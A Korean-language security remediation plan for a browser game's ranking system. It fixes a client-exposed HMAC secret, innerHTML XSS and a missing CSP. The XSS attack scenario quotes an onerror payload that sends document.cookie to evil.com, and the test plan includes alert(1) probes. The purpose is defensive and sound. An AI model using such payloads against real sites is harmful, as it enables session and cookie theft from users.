# RescapeR 보안 취약점 수정 계획서

> **작성일**: 2026-03-20
> **분석 대상**: playable-web/, server/
> **Phase 1 목표**: CRITICAL/HIGH 심각도 취약점 즉시 해소

---

## Phase 1 작업 개요

| 순서 | 심각도 | 취약점 | 영향 범위 | 수정 난이도 | 예상 파일 변경 |
|------|--------|--------|-----------|-------------|---------------|
| 1-1 | **CRITICAL** | HMAC 시크릿 키 클라이언트 노출 | 랭킹 시스템 전체 무결성 | 중간 | 3개 파일 |
| 1-2 | **HIGH** | XSS (innerHTML 미이스케이프) | 랭킹보드 조회 사용자 전원 | 낮음 | 2개 파일 |
| 1-3 | **HIGH** | CSP 헤더 부재 | 전체 클라이언트 | 낮음 | 2개 파일 |

---

## 1-1. CRITICAL: HMAC 시크릿 키 클라이언트 노출

### 현재 상태

클라이언트와 서버가 **동일한 하드코딩 시크릿 키**를 공유하는 구조:

```
[클라이언트]                           [서버]
ranking-system.js:7                   server/index.js:12
SECRET_KEY = 'rescaper_secret_       SECRET_KEY = env || 'rescaper_secret_
token_2024'                           token_2024'
    ↓                                     ↓
HMAC 체크섬 생성 ──POST──→          HMAC 체크섬 검증
```

**위험**: 브라우저 DevTools → Sources 탭에서 시크릿 키를 확인하고, 임의의 랭킹 데이터에 유효한 체크섬을 생성하여 위조 기록을 제출할 수 있음.

### 노출 위치

| 파일 | 라인 | 코드 |
|------|------|------|
| `playable-web/systems/ranking-system.js` | 7 | `const SECRET_KEY = 'rescaper_secret_token_2024';` |
| `server/index.js` | 12 | `const SECRET_KEY = process.env.RANKING_SECRET_KEY \|\| 'rescaper_secret_token_2024';` |
| `server/.env` | 2 | `RANKING_SECRET_KEY=rescaper_secret_token_2024` |

### 수정 방안

**핵심 원칙**: 클라이언트에서 시크릿 키를 완전히 제거하고, 서버만 체크섬 검증을 수행하는 구조로 전환.

#### A안: 서버 전용 체크섬 (권장)

```
[클라이언트]                           [서버]
{name, time, pay} ──POST──→       체크섬 자체 생성 & 저장
                                    (클라이언트는 체크섬 불필요)
```

- 클라이언트에서 `generateChecksum()` 로직 및 `SECRET_KEY` 제거
- 서버에서 수신된 데이터로 직접 체크섬을 생성하여 DB에 저장
- 체크섬은 **데이터 무결성 서명(서버 기록 위변조 방지)**으로만 사용

#### B안: 세션 토큰 기반 검증 (강화)

```
[클라이언트]                           [서버]
GET /session-token ←──────        1. 게임 시작 시 토큰 발급 (UUID + 타임스탬프)
                                    2. 토큰 저장 (메모리/Redis)

{name, time, pay,                 3. 토큰 유효성 검증
 session_token} ──POST──→         4. 1회용 토큰 소멸
                                    5. 시간 범위 검증 (시작~종료)
```

- 게임 시작 시 서버에서 세션 토큰 발급
- 기록 제출 시 토큰 동봉 → 서버에서 유효성 검증 후 1회용으로 소멸
- 토큰 발급 시각과 기록 제출 시각의 차이로 clear_time 합리성 교차 검증

### 수정 대상 파일

| 파일 | 변경 내용 |
|------|-----------|
| `playable-web/systems/ranking-system.js` | `SECRET_KEY` 삭제, `generateChecksum()` 삭제, `submitRecord()`에서 체크섬 없이 데이터만 전송 |
| `server/index.js` | 체크섬 생성을 서버에서 수행, 클라이언트 체크섬 비교 로직 제거, 시크릿 키 기본값 제거 |
| `server/.env` | 시크릿 키를 강력한 랜덤 값으로 교체 (`.env.example`만 커밋) |

### 추가 조치: Git 히스토리 정제

```bash
# server/.env가 Git 히스토리에 남아 있는지 확인
git log --all --full-history -- server/.env

# 히스토리에서 제거 (BFG Repo-Cleaner 사용)
bfg --delete-files .env
git reflog expire --expire=now --all && git gc --prune=now --aggressive

# 시크릿 키 즉시 교체 (기존 키는 이미 노출된 것으로 간주)
openssl rand -base64 32  # 새 키 생성
```

### 테스트 계획

- [ ] 클라이언트 빌드에서 `SECRET_KEY` 문자열이 없는지 확인 (`grep -r "rescaper_secret" playable-web/`)
- [ ] 체크섬 없이 랭킹 제출 → 서버 정상 저장 확인
- [ ] 서버 체크섬이 DB에 올바르게 저장되는지 확인
- [ ] 기존 랭킹 조회 API 정상 동작 확인
- [ ] 오프라인 버퍼링 → 재전송 정상 동작 확인

---

## 1-2. HIGH: XSS (Cross-Site Scripting)

### 현재 상태

서버에서 받은 `player_name`을 HTML 이스케이프 없이 `innerHTML`로 삽입:

```javascript
// ui-system.js:68 — 랭킹보드 렌더링
html += `<td>${item.player_name}</td>`;  // ← 미이스케이프
container.innerHTML = html;              // ← innerHTML 사용
```

```javascript
// game.js:48 — 게임 로그
logEl.innerHTML = state.logs.map(x => `<div>${x}</div>`).join("");
```

### 공격 시나리오

```
1. 공격자가 플레이어명으로 다음을 등록:
   <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">

2. 다른 사용자가 랭킹보드(명예의 퇴근 명부) 조회

3. innerHTML이 플레이어명을 HTML로 파싱 → <img> 태그 렌더링 → onerror 실행

4. 피해자의 브라우저에서 공격자 서버로 쿠키/세션 정보 전송
```

### innerHTML 사용 위치 전수 조사

| 파일 | 라인 | 용도 | XSS 위험도 |
|------|------|------|------------|
| `game.js:48` | 게임 로그 표시 | **중간** — 로그 메시지에 플레이어명 포함 가능 |
| `game.js:53` | 시네마틱 오프닝/엔딩 | 낮음 — 정적 텍스트만 사용 |
| `game.js:136` | 사원명 입력 폼 | 낮음 — 정적 HTML |
| `game.js:198` | 일시정지 화면 | **중간** — `state.floor.info.name` 표시 |
| `game.js:524` | 사망 화면 | 낮음 — 정적 HTML |
| `game.js:563` | 클리어 화면 | **중간** — 플레이어명/기록 표시 |
| `game.js:620` | 스킬 선택 UI | 낮음 — data-config 정적 데이터 |
| `game.js:662` | 상점 UI | 낮음 — data-config 정적 데이터 |
| **`ui-system.js:68`** | **랭킹보드** | **높음** — **서버에서 받은 player_name 직접 삽입** |
| `ui-system.js:76` | 랭킹 컨테이너 | 위 68번 라인의 결과물 |

### 수정 방안

#### 1단계: HTML 이스케이프 유틸리티 추가

```javascript
// 방법 1: 순수 문자열 치환 (가장 간단)
function escapeHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}
```

#### 2단계: 위험 위치 수정

**ui-system.js:68** (최우선):
```javascript
// Before
html += `<td style="padding:10px;">${item.player_name}</td>`;

// After
html += `<td style="padding:10px;">${escapeHtml(item.player_name)}</td>`;
```

**game.js:48** (로그):
```javascript
// Before
logEl.innerHTML = state.logs.map(x => `<div>${x}</div>`).join("");

// After
logEl.innerHTML = state.logs.map(x => `<div>${escapeHtml(x)}</div>`).join("");
```

#### 3단계: 서버 측 입력 검증 추가 (server/index.js)

```javascript
// 플레이어명에서 HTML 태그 차단
if (/<[^>]*>/.test(player_name)) {
  return res.status(400).json({ error: '사원명에 특수 문자를 사용할 수 없습니다.' });
}

// 길이 제한 (클라이언트 maxlength=10과 동기화)
if (typeof player_name !== 'string' || player_name.length === 0 || player_name.length > 10) {
  return res.status(400).json({ error: '사원명은 1~10자여야 합니다.' });
}
```

### 수정 대상 파일

| 파일 | 변경 내용 |
|------|-----------|
| `playable-web/systems/ui-system.js` | `escapeHtml()` 추가, `player_name` 이스케이프 적용 |
| `playable-web/game.js` | `escapeHtml()` 유틸리티 추가, 로그/클리어 화면에서 사용자 입력값 이스케이프 |
| `server/index.js` | `player_name` HTML 태그 차단 + 길이 제한 검증 추가 |

### 테스트 계획

- [ ] 플레이어명 `<script>alert(1)</script>` 입력 → 랭킹 등록 차단 확인 (서버)
- [ ] 플레이어명 `<img src=x onerror=alert(1)>` → 랭킹보드에서 평문 표시 확인 (클라이언트)
- [ ] 정상 플레이어명 (한글, 영문, 숫자) → 정상 표시 확인
- [ ] 게임 로그에서 특수문자 포함 메시지 → 이스케이프 확인
- [ ] 기존 Playwright E2E 테스트 통과 확인

---

## 1-3. HIGH: Content Security Policy (CSP) 부재

### 현재 상태

`index.html`에 CSP 관련 설정이 전혀 없음:

```html
<!-- playable-web/index.html:1-12 -->
<!doctype html>
<html lang="ko">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <!-- CSP 메타 태그 없음 -->
    <!-- X-Frame-Options 없음 -->
  </head>
```

### 위험

| 공격 | CSP 없을 때 | CSP 있을 때 |
|------|------------|------------|
| 인라인 스크립트 삽입 | 실행됨 | 차단됨 |
| 외부 JS 로드 (`<script src="evil.com">`) | 로드됨 | 차단됨 |
| 데이터 유출 (`fetch("evil.com")`) | 전송됨 | 차단됨 |
| 클릭재킹 (iframe 임베딩) | 가능 | 차단됨 |

### 수정 방안

#### 1단계: `index.html`에 CSP 메타 태그 추가

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self';
  media-src 'self';
  frame-ancestors 'none';
  base-uri 'self';
  form-action 'self';
  object-src 'none';
" />
```

**정책 설명**:

| 디렉티브 | 값 | 이유 |
|----------|------|------|
| `default-src` | `'self'` | 기본적으로 같은 오리진만 허용 |
| `script-src` | `'self'` | 외부 스크립트 차단, 인라인 스크립트 차단 |
| `style-src` | `'self' 'unsafe-inline'` | 게임 UI에서 인라인 스타일 사용하므로 허용 |
| `img-src` | `'self' data:` | 게임 에셋 + data URI (이모지 등) |
| `connect-src` | `'self'` | API 호출은 같은 오리진 (nginx 프록시) |
| `frame-ancestors` | `'none'` | 클릭재킹 방지 (iframe 삽입 차단) |
| `object-src` | `'none'` | Flash/Java 플러그인 차단 |

#### 2단계: nginx 서버 헤더로도 추가 (docker/nginx.conf)

```nginx
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; object-src 'none';" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
```

### 주의사항: `onclick` 인라인 핸들러 호환성

현재 `game.js`에서 `onclick` 인라인 핸들러를 사용하는 곳이 있음:

| 파일 | 라인 | 코드 |
|------|------|------|
| `game.js:528` | `<button onclick="location.reload()">` |
| `game.js:625` | `onclick="window.gameState.pickSkill(${i})"` |

`script-src 'self'`는 **인라인 이벤트 핸들러를 차단**하므로, 이를 이벤트 리스너로 리팩터링해야 함:

```javascript
// Before (CSP 위반)
overlayEl.innerHTML = `<button onclick="location.reload()">다시 시작</button>`;

// After (CSP 호환)
overlayEl.innerHTML = `<button id="restart-btn">다시 시작 (R)</button>`;
document.getElementById("restart-btn").addEventListener("click", () => location.reload());
```

**이 리팩터링은 CSP 적용의 선행 조건이므로 같은 작업 단위에 포함.**

### 수정 대상 파일

| 파일 | 변경 내용 |
|------|-----------|
| `playable-web/index.html` | CSP 메타 태그 추가 |
| `playable-web/game.js` | `onclick` 인라인 핸들러 → `addEventListener` 전환 (528, 625 라인) |
| `docker/nginx.conf` | 보안 응답 헤더 추가 |

### 테스트 계획

- [ ] 게임 정상 로드 확인 (CSP 위반 콘솔 에러 없음)
- [ ] 스킬 선택 클릭 정상 동작 확인
- [ ] 사망 화면 "다시 시작" 버튼 정상 동작 확인
- [ ] 브라우저 콘솔에서 `<script>` 태그 삽입 시도 → CSP에 의해 차단 확인
- [ ] iframe 임베딩 시도 → 차단 확인
- [ ] 기존 Playwright E2E 테스트 전체 통과 확인

---

## 작업 순서 및 의존 관계

```
1-1 CRITICAL: 시크릿 키 제거
 ├─ ranking-system.js 수정 (체크섬 생성 제거)
 ├─ server/index.js 수정 (서버 전용 체크섬)
 └─ server/.env 재생성 + Git 히스토리 정제

1-2 HIGH: XSS 방어 (1-1과 병렬 가능)
 ├─ escapeHtml() 유틸리티 추가
 ├─ ui-system.js 이스케이프 적용
 ├─ game.js 로그/화면 이스케이프 적용
 └─ server/index.js 입력 검증 추가

1-3 HIGH: CSP 적용 (1-2 완료 후 진행)
 ├─ game.js onclick → addEventListener 리팩터링 (선행)
 ├─ index.html CSP 메타 태그 추가
 └─ docker/nginx.conf 보안 헤더 추가
```

> **참고**: 1-3(CSP)은 1-2(XSS)에서 innerHTML 패턴 수정이 안정된 후 진행하는 것이 안전함.
> 인라인 핸들러 리팩터링이 CSP 적용의 전제 조건이므로 순서 준수 필요.

---

## 완료 기준 체크리스트

### 1-1 CRITICAL 완료 조건
- [ ] `grep -r "rescaper_secret" playable-web/` 결과 0건
- [ ] 클라이언트 소스에 시크릿 키 문자열 없음
- [ ] 서버 `.env` 강력한 랜덤 키 적용
- [ ] `.env.example` 파일만 Git에 커밋 (실제 `.env`는 `.gitignore`)
- [ ] 랭킹 제출/조회 정상 동작

### 1-2 HIGH 완료 조건
- [ ] `player_name`에 HTML 태그 입력 시 평문으로 표시 (클라이언트)
- [ ] 서버에서 HTML 태그 포함 플레이어명 거부 (400 응답)
- [ ] 기존 E2E 테스트 통과

### 1-3 HIGH 완료 조건
- [ ] 브라우저 콘솔에 CSP 위반 에러 없음
- [ ] `onclick` 인라인 핸들러 0건 (`grep -r "onclick" playable-web/`)
- [ ] 외부 스크립트 삽입 시도 → 콘솔에서 CSP 차단 확인
- [ ] 기존 E2E 테스트 통과

---

## Phase 2 예고 (다음 단계)

Phase 1 완료 후 진행할 MEDIUM 심각도 항목:

| 순서 | 취약점 | 위치 |
|------|--------|------|
| 2-1 | 서버 입력 검증 강화 (타입/범위) | `server/index.js:40-50` |
| 2-2 | DB 기본 비밀번호 제거 | `db.js:7`, `docker-compose.prod.yml:13` |
| 2-3 | Rate Limiting 추가 | `server/index.js` |
| 2-4 | 전역 state 노출 제거 | `game.js:41` |
| 2-5 | 민감 정보 로깅 제거 | `server/index.js:64-68` |
| 2-6 | CORS 화이트리스트 설정 | `server/index.js:15` |
